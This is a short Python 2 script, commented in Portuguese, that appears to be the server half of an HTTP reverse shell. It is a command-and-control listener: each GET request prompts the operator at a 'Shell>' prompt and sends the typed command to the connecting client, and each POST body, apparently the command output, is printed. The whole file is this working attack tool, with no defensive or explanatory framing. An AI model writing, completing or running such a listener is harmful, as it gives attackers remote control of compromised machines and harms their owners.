#Server


import BaseHTTPServer 
import os,cgi

HOST_NAME = 'localhost'  # Aqui vai o ip do servidor
PORT_NUMBER = 64000      # Aqui vai a porta


class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler): 

    def do_GET(s):
                                        
        command = raw_input("Shell> ") 
        s.send_response(200)             
        s.send_header("Content-type", "text/html")  
        s.end_headers()
        s.wfile.write(command)           

            
    def do_POST(s):
        s.send_response(200)                        
        s.end_headers()
        length  = int(s.headers['Content-Length'])                                              
        postVar = s.rfile.read(length)               
        print postVar




if __name__ == '__main__':    

    httpd = BaseHTTPServer.HTTPServer((HOST_NAME, PORT_NUMBER), MyHandler)
 
    try:     
        httpd.serve_forever()  
    except KeyboardInterrupt:   
        print '[!] Conexao Encerrada'
        httpd.server_close()

